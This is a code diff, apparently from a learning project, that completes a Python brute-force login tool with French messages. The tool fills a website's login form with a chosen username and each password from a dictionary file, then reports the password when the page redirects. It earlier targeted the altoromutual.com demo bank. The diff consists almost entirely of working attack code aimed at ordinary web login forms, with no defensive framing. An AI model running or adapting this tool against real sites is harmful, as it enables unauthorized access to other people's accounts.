@@ -16,7 +16,7 @@ class BruteForceLogin:
         self.print_welcome()
         self.get_args()
         passwords = self.read_dictionary()
-        self.brute_force_login()
+        self.brute_force_login(passwords)
 
     def print_welcome(self):
         print("Bienvenue à BruteForceLogin!")
@@ -47,15 +47,31 @@ class BruteForceLogin:
         return passwords
 
     # En faire une classe
-    def brute_force_login(self):
+    def brute_force_login(self, passwords):
         browser = RoboBrowser(history=True)
         browser.open(self.url)
-        all_forms = browser.get_forms()
+
         form_name = self.get_form_name()
+        form = browser.get_form(form_name)
+
+        username_to_enter = input("Entrez le nom de l'utilisateur que vous voulez hacker: ")
+        print("Hackage en cours...")
+        for password in passwords:
+            form[self.username].value = username_to_enter
+            form[self.passname].value = password
+            form.serialize()
+            browser.submit_form(form)
+            if browser.url != self.url:
+                print("Mot de passe trouvé! " + password)
+                sys.exit(1)
+            else:
+                print("le mot de passe" + password + "n\'a pas fonctionné...")
+
+        print("Le compte utilisateur n'a pas pu être hacké.")
 
     def get_form_name(self):
         http = Http('.cache')
-        response, content = http.request('http://altoromutual.com/bank/login.aspx')
+        response, content = http.request(self.url)
         forms = BeautifulSoup(content, "html.parser").findAll('form')
 
         for form in forms:
